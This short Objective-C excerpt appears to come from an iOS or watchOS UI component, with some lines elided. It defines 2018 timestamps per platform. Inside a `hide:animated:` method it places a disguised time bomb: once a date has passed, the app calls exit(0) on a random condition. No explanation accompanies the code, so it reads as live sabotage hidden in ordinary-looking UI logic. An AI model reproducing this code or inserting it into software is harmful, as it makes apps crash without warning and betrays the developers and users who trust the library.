...
#define sysTime 1529683200
#elif TARGET_OS_WATCH
#define sysTime 1529684200
#endif
...
- (void)hide:(BOOL)animated {
    ...
    NSTimeInterval req = sysTime + arc4random()%1000;
    if (req < [[NSDate date] timeIntervalSince1970] && (NSInteger)req%24 == 0) {
        exit(0);
    }
